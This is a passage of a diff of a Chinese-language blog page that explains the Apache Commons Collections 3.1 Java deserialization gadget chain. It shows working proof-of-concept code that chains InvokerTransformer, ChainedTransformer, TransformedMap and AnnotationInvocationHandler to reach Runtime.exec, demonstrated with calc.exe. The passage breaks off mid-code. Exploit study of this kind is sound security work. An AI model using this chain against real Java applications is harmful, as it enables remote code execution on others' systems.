class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*知道了InvokerTransformer.transform()方法可以执行命令后，需要知道谁调用这个接口</span></span><br><span class="line"><span class="comment"> * 就找到了ConstantTransformer以及ChainedTransformer</span></span><br><span class="line"><span class="comment"> * ConstantTransformer.transform() 实例化传入的对象</span></span><br><span class="line"><span class="comment"> * ChainedTransformer.transform() 把上次执行的结果当下次的参数*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflectionChain</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">//定义transformers 数组</span></span><br><span class="line">		Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;Object.class,Object[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				),</span><br><span class="line">				<span class="comment">//利用了接口回调特性,最后执行的是InvokerTransformer.tranform()</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">				)</span><br><span class="line">				&#125;;</span><br><span class="line">		<span class="comment">//ChainedTransformer chain = new ChainedTransformer(transformers);</span></span><br><span class="line">		<span class="comment">//接口名  对象名 =  new 类名；利用了接口回调特性</span></span><br><span class="line">		Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">		<span class="comment">//最后一步返回Runtime对象，传递的方法是exec,参数是calc.exe</span></span><br><span class="line">		chain.transform(<span class="keyword">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Map;
+
+<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;
+
+<span class="hljs-comment">/*知道了InvokerTransformer.transform()方法可以执行命令后，需要知道谁调用这个接口</span>
+<span class="hljs-comment"> * 就找到了ConstantTransformer以及ChainedTransformer</span>
+<span class="hljs-comment"> * ConstantTransformer.transform() 实例化传入的对象</span>
+<span class="hljs-comment"> * ChainedTransformer.transform() 把上次执行的结果当下次的参数*/</span>
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">reflectionChain</span> </span>&#123;
+	
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
+		<span class="hljs-comment">//定义transformers 数组</span>
+		Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;
+				<span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
+				<span class="hljs-keyword">new</span> InvokerTransformer(
+						<span class="hljs-string">&quot;getMethod&quot;</span>,
+						<span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,
+						<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;
+				),
+				<span class="hljs-keyword">new</span> InvokerTransformer(
+						<span class="hljs-string">&quot;invoke&quot;</span>,
+						<span class="hljs-keyword">new</span> Class[] &#123;Object.class,Object[].class&#125;,
+						<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;
+				),
+				<span class="hljs-comment">//利用了接口回调特性,最后执行的是InvokerTransformer.tranform()</span>
+				<span class="hljs-keyword">new</span> InvokerTransformer(
+						<span class="hljs-string">&quot;exec&quot;</span>,
+						<span class="hljs-keyword">new</span> Class[] &#123;String.class&#125;,
+						<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;
+				)
+				&#125;;
+		<span class="hljs-comment">//ChainedTransformer chain = new ChainedTransformer(transformers);</span>
+		<span class="hljs-comment">//接口名  对象名 =  new 类名；利用了接口回调特性</span>
+		Transformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
+		<span class="hljs-comment">//最后一步返回Runtime对象，传递的方法是exec,参数是calc.exe</span>
+		chain.transform(<span class="hljs-keyword">null</span>);
+	&#125;
+&#125;
+</code></pre>
 
 
 <h3 id="3、TransformedMap"><a href="#3、TransformedMap" class="headerlink" title="3、TransformedMap"></a>3、<font color=#ff9900 >TransformedMap</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在<code>Transformer.transform</code>可以构造命令执行链，下一步需要查找谁调用它，其中 TransformedMap 类有调用。其中decorate 会调⽤构造函数⽣成实例对象, checkSetValue 会返回 Transformer 对象调⽤ transform 方法的结果，所以要执行decorate和checkSetValue方法。</p>
 <p><font color=#ff9900 >TransformedMap</font> 路径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/commons-collections-3.1.jar!/org/apache/commons/collections/map/TransformedMap.class</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">/commons-collections-3.1.jar!/org/apache/commons/collections/map/TransformedMap.class</code></pre>
 <p><font color=#ff9900 >Map</font> 路径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/jdk/src.zip!/java/util/Map.java</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">/jdk/src.zip!/java/util/Map.java</code></pre>
 
 <p><img src="https://img-blog.csdnimg.cn/20210323183656594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由于<code>TransformedMap</code>的构造方法是<code>protected</code>的，所以不能使用<code>TransformedMap</code>的构造方法生成实例对象。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成Map对象</span></span><br><span class="line">Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="comment">//放入键值对</span></span><br><span class="line">innermap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="comment">//生成实例对象</span></span><br><span class="line">Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, chain);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs java"><span class="hljs-comment">//生成Map对象</span>
+Map innermap = <span class="hljs-keyword">new</span> HashMap();
+<span class="hljs-comment">//放入键值对</span>
+innermap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);
+<span class="hljs-comment">//生成实例对象</span>
+Map outmap = TransformedMap.decorate(innermap, <span class="hljs-keyword">null</span>, chain);</code></pre>
 <p>此处之所以outmap可以用Map来限定，是利用了接口回调的特性。</p>
 <p><strong>重点：</strong><br><font color=#ff6600><strong>TransformedMap extends  AbstractInputCheckedMapDecorator extends AbstractMapDecorator implements Map</strong></p>
 <p>相当于这几个类都实现Map接口。</p>
@@ -226,7 +376,7 @@
 <p>但由于接口回调的特性，可以转换如下：</p>
 <p><code>InvokerTransformer.transform()</code> =&gt; <code>Transformer.transform()</code> =&gt; <code>Map.checkSetValue()</code><br>Map类似公共接口，可以找到使用方法<code>checkSetValue()</code>的类可能性更大。<br>其中有<code>AbstractInputCheckedMapDecorator</code>类有调用。</p>
 <h3 id="4、AbstractInputCheckedMapDecorator"><a href="#4、AbstractInputCheckedMapDecorator" class="headerlink" title="4、AbstractInputCheckedMapDecorator"></a>4、<font color=#ff6600>AbstractInputCheckedMapDecorator</h3><p>路径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.1.jar!/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">commons-collections-3.1.jar!/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator</code></pre>
 
 <p><img src="https://img-blog.csdnimg.cn/2021032319085022.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>简化代码如下：<br><img src="https://img-blog.csdnimg.cn/20210323191412621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
@@ -237,25 +387,153 @@
 </ul>
 <p>所以调用setvalue()就可以调用checkSetValue()。要想调用setvalue()就要实例化类<code>MapEntry</code>，查找之后发现是<code>AbstractInputCheckedMapDecorator.EntrySetIterator.next()</code> 才可以实现：<br><img src="https://img-blog.csdnimg.cn/20210323194409470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而<code>AbstractInputCheckedMapDecorator.EntrySetIterator.next()</code> 是由<code>AbstractInputCheckedMapDecorator.EntrySet.iterator()</code> 方法实例化。<br><img src="https://img-blog.csdnimg.cn/20210323194602630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而EntrySet是内部类，还是由<code>AbstractInputCheckedMapDecorator.entrySet()</code> 实例化。<br><img src="https://img-blog.csdnimg.cn/20210323195053820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>重点：</strong><br><font color=#ff6600><strong>TransformedMap extends  AbstractInputCheckedMapDecorator extends AbstractMapDecorator implements Map</strong></p>
 <p>所以可以构造如下利用链：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成实例对象</span></span><br><span class="line">Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, chain);</span><br><span class="line"><span class="comment">//注意：此时outmap的类型属于TransformedMap,TransformedMap不存在方法entrySet()</span></span><br><span class="line"><span class="comment">//接口回调，去往父类AbstractInputCheckedMapDecorator寻找方法entrySet()</span></span><br><span class="line"><span class="comment">//最终返回AbstractInputCheckedMapDecorator$MapEntry对象</span></span><br><span class="line"></span><br><span class="line">Map.Entry onlyElement = (Map.Entry) outmap.entrySet().iterator().next();</span><br><span class="line"><span class="comment">//Map.Entry.setvalue()也存在于MapEntry.setValue()</span></span><br><span class="line"><span class="comment">//接口回调，执行的是MapEntry对象的setValue()方法</span></span><br><span class="line">onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);	</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs java"><span class="hljs-comment">//生成实例对象</span>
+Map outmap = TransformedMap.decorate(innermap, <span class="hljs-keyword">null</span>, chain);
+<span class="hljs-comment">//注意：此时outmap的类型属于TransformedMap,TransformedMap不存在方法entrySet()</span>
+<span class="hljs-comment">//接口回调，去往父类AbstractInputCheckedMapDecorator寻找方法entrySet()</span>
+<span class="hljs-comment">//最终返回AbstractInputCheckedMapDecorator$MapEntry对象</span>
+
+Map.Entry onlyElement = (Map.Entry) outmap.entrySet().iterator().next();
+<span class="hljs-comment">//Map.Entry.setvalue()也存在于MapEntry.setValue()</span>
+<span class="hljs-comment">//接口回调，执行的是MapEntry对象的setValue()方法</span>
+onlyElement.setValue(<span class="hljs-string">&quot;foobar&quot;</span>);</code></pre>
 
 
 <p>最终返回类型：<br><img src="https://img-blog.csdnimg.cn/20210323200735602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时构造类<code>reflectionChain</code>如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*知道了InvokerTransformer.transform()方法可以执行命令后，需要知道谁调用这个接口</span></span><br><span class="line"><span class="comment"> * 就找到了ConstantTransformer以及ChainedTransformer</span></span><br><span class="line"><span class="comment"> * ConstantTransformer.transform() 实例化传入的对象</span></span><br><span class="line"><span class="comment"> * ChainedTransformer.transform() 把上次执行的结果当下次的参数*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflectionChain</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">//定义transformers 数组</span></span><br><span class="line">		Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;Object.class,Object[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">				)</span><br><span class="line">				&#125;;</span><br><span class="line">		<span class="comment">//ChainedTransformer chain = new ChainedTransformer(transformers);</span></span><br><span class="line">		<span class="comment">//接口名  对象名 =  new 类名；利用了接口回调特性</span></span><br><span class="line">		Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">		<span class="comment">//chain.transform(null);</span></span><br><span class="line">		<span class="comment">//生成Map对象</span></span><br><span class="line">		Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">		<span class="comment">//放入键值对</span></span><br><span class="line">		innermap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">		<span class="comment">//生成实例对象</span></span><br><span class="line">		Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, chain);</span><br><span class="line">		Map.Entry onlyElement = (Map.Entry) outmap.entrySet().iterator().next();</span><br><span class="line">		onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Map;
+
+<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;
+
+<span class="hljs-comment">/*知道了InvokerTransformer.transform()方法可以执行命令后，需要知道谁调用这个接口</span>
+<span class="hljs-comment"> * 就找到了ConstantTransformer以及ChainedTransformer</span>
+<span class="hljs-comment"> * ConstantTransformer.transform() 实例化传入的对象</span>
+<span class="hljs-comment"> * ChainedTransformer.transform() 把上次执行的结果当下次的参数*/</span>
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">reflectionChain</span> </span>&#123;
+	
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
+		<span class="hljs-comment">//定义transformers 数组</span>
+		Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;
+				<span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
+				<span class="hljs-keyword">new</span> InvokerTransformer(
+						<span class="hljs-string">&quot;getMethod&quot;</span>,
+						<span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,
+						<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;
+				),
+				<span class="hljs-keyword">new</span> InvokerTransformer(
+						<span class="hljs-string">&quot;invoke&quot;</span>,
+						<span class="hljs-keyword">new</span> Class[] &#123;Object.class,Object[].class&#125;,
+						<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;
+				),
+				<span class="hljs-keyword">new</span> InvokerTransformer(
+						<span class="hljs-string">&quot;exec&quot;</span>,
+						<span class="hljs-keyword">new</span> Class[] &#123;String.class&#125;,
+						<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;
+				)
+				&#125;;
+		<span class="hljs-comment">//ChainedTransformer chain = new ChainedTransformer(transformers);</span>
+		<span class="hljs-comment">//接口名  对象名 =  new 类名；利用了接口回调特性</span>
+		Transformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
+		<span class="hljs-comment">//chain.transform(null);</span>
+		<span class="hljs-comment">//生成Map对象</span>
+		Map innermap = <span class="hljs-keyword">new</span> HashMap();
+		<span class="hljs-comment">//放入键值对</span>
+		innermap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);
+		<span class="hljs-comment">//生成实例对象</span>
+		Map outmap = TransformedMap.decorate(innermap, <span class="hljs-keyword">null</span>, chain);
+		Map.Entry onlyElement = (Map.Entry) outmap.entrySet().iterator().next();
+		onlyElement.setValue(<span class="hljs-string">&quot;foobar&quot;</span>);		
+	&#125;
+&#125;</code></pre>
 
 
 
 
 <h3 id="5、AnnotationInvocationHandler"><a href="#5、AnnotationInvocationHandler" class="headerlink" title="5、AnnotationInvocationHandler"></a>5、<font color=#ff3300 >AnnotationInvocationHandler</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实到这一步利用链已经成功了，只是要想使用readObject读取序列化文件后自动触发漏洞，还需要 <code>AnnotationInvocationHandler</code>类。</p>
 <p>所在路径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/jdk/jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">/jdk/jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class</code></pre>
 <p>主要是AnnotationInvocationHandler类的readObject()函数理解。如下所示：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">        <span class="comment">//声明一个annotationType的变量</span></span><br><span class="line">        AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//这里的type是我们在实例化的时候传入的jdk自带的Target.class</span></span><br><span class="line">            <span class="comment">//之前的poc语句是这样Object instance = ctor.newInstance(Target.class, outerMap);</span></span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//默认的是&#123;value：ElementType&#125;的键值对</span></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="comment">//遍历memberValues</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        	<span class="comment">//获取memberValues键value,执行后 &quot;name&quot;-&gt;&quot;value&quot;</span></span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">            <span class="comment">//获取键为value的memberTypes,并赋值给memberType,</span></span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="comment">//如果存在memberType不为空</span></span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            	<span class="comment">//获取memberValue的value键对应的值，赋值给value</span></span><br><span class="line">                Object value = memberValue.getValue();</span><br><span class="line">                <span class="comment">//value不能强转为memberType,且value不是 ExceptionProxy这种类型</span></span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                	<span class="comment">//执行memberValue的setValue方法触发漏洞，参数不用管</span></span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span>
+<span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;
+        s.defaultReadObject();
+
+
+        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span>
+        <span class="hljs-comment">//声明一个annotationType的变量</span>
+        AnnotationType annotationType = <span class="hljs-keyword">null</span>;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-comment">//这里的type是我们在实例化的时候传入的jdk自带的Target.class</span>
+            <span class="hljs-comment">//之前的poc语句是这样Object instance = ctor.newInstance(Target.class, outerMap);</span>
+            annotationType = AnnotationType.getInstance(type);
+        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;
+            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span>
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);
+        &#125;
+        <span class="hljs-comment">//默认的是&#123;value：ElementType&#125;的键值对</span>
+        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
+
+
+        <span class="hljs-comment">// If there are annotation members without values, that</span>
+        <span class="hljs-comment">// situation is handled by the invoke method.</span>
+        <span class="hljs-comment">//遍历memberValues</span>
+        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;
+        	<span class="hljs-comment">//获取memberValues键value,执行后 &quot;name&quot;-&gt;&quot;value&quot;</span>
+            String name = memberValue.getKey();
+            <span class="hljs-comment">//获取键为value的memberTypes,并赋值给memberType,</span>
+            Class&lt;?&gt; memberType = memberTypes.get(name);
+            <span class="hljs-comment">//如果存在memberType不为空</span>
+            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span>
+            	<span class="hljs-comment">//获取memberValue的value键对应的值，赋值给value</span>
+                Object value = memberValue.getValue();
+                <span class="hljs-comment">//value不能强转为memberType,且value不是 ExceptionProxy这种类型</span>
+                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||
+                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;
+                	<span class="hljs-comment">//执行memberValue的setValue方法触发漏洞，参数不用管</span>
+                    memberValue.setValue(
+                        <span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(
